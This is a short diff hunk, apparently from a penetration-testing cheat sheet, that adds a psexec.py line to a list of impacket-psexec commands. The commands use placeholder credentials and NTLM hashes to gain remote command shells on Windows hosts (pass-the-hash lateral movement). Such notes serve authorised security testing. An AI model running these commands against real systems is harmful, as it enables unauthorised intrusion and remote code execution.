@@ -6874,6 +6874,7 @@ impacket-psexec -hashes 00000000000000000000000000000000:HASH USER@IP
 impacket-psexec -hashes :HASH USER@IP
 psexec WORKGROUP/USER@PIP cmd.exe
 impacket-psexec WORKGROUP\username@IP cmd.exe
+psexec.py 'DOMAIN/USER:PASS'@IP
 ```
 
 pipenv shell
